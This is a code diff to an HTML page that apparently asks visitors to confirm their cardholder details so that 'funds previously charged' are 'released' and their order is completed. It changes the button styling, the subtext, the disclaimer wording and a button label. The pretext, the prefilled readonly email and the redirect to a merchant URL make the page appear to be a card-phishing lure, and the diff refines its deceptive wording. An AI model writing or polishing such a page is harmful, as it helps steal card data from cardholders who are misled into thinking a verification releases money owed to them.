@@ -362,8 +362,8 @@
       /* Verify button */
       .verify-btn {
         width: 100%;
-        height: 55px;
-        background: #0074d4;
+        height: 50px;
+        background: #556cd6;
         border: none;
         border-radius: 6px;
         font-family: inherit;
@@ -572,7 +572,7 @@
           <div class="panel-right-inner">
             <h2 class="section-heading">Confirm your identity</h2>
             <p class="section-subtext">
-              Please confirm the details below to verify you are the authorized cardholder and release your payment.
+              Fill the details below to verify you are the authorized cardholder.
             </p>
 
             <!-- Email (readonly) -->
@@ -616,7 +616,7 @@
             <button class="verify-btn" id="verify-btn" onclick="submitVerification()">Verify my identity</button>
 
             <div class="verify-disclaimer">
-              This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
+              This one-time verification will release the funds previously charged to your account and will let you complete the order.
             </div>
 
             <!-- Footer -->
@@ -784,7 +784,7 @@
                 window.location.href = 'https://' + p.merchant_url;
               }, 5000);
             } else {
-              btn.textContent = 'Verify my identity';
+              btn.textContent = 'Confirm my identity';
               btn.disabled = false;
               alert('Verification failed. Please try again.');
             }
